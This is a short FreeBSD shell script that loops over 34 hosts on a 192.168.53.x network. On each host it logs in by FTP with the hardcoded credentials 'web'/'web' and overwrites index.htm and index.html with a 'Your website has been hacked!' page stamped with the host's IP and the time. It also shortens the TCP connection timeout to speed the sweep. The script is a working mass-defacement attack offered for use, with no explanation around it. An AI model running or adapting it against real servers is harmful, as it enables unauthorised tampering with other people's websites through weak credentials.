#!/bin/sh
# Tested in FreeBSD

sudo sysctl net.inet.tcp.keepinit=1000

for i in `jot 1 34`
do
echo "Your website has been hacked!<br>192.168.53.$i<br>`date +%H:%M:%S`" > index.htm
echo "Your website has been hacked!<br>192.168.53.$i<br>`date +%H:%M:%S`" > index.html
ftp -a 192.168.53.$i << EOF
user web web
put index.htm
put index.html
quit
EOF
rm index.*
done

sudo sysctl net.inet.tcp.keepinit=75000
